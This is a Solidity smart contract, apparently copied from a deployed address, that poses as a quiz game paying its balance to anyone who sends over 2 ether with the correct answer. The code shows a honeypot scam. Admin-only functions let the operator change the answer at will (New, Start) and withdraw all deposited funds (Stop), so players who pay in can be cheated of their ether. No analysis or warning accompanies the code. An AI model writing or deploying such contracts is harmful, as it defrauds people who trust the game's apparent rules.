pragma solidity ^0.8.30;

//0x896b0b5b747a91125f212c2ed666fb773e49c097.sol
contract QUIZ {
    function Try(string memory _response) external payable {
        require(msg.sender == tx.origin);

        // if response == _response and msg.value > 2 ether, then transfer the balance to the sender
        if (
            keccak256(abi.encodePacked(response)) ==
            keccak256(abi.encodePacked(_response)) &&
            msg.value > 2 ether
        ) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    string response;

    mapping(address => bool) admin;

    function Start(
        string memory _question,
        string memory _response
    ) public payable isAdmin {
        response = _response;

        question = _question;
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(
        string memory _question,
        string memory _response
    ) public payable isAdmin {
        question = _question;

        response = _response;
    }

    constructor(address[] memory admins) {
        for (uint256 i = 0; i < admins.length; i++) {
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin() {
        require(admin[msg.sender]);

        _;
    }
}
